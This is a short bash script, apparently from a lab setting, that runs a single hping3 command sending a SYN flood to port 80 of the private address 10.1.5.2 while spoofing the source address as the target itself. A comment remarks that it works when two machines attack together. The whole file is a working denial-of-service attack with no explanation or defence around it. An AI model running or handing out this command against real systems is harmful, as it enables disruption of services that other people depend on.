#!/bin/bash

# It works if 2 machine are attacking

sudo hping3 -S --flood --baseport 80 --keep --destport 80 10.1.5.2 -a 10.1.5.2 > /dev/null
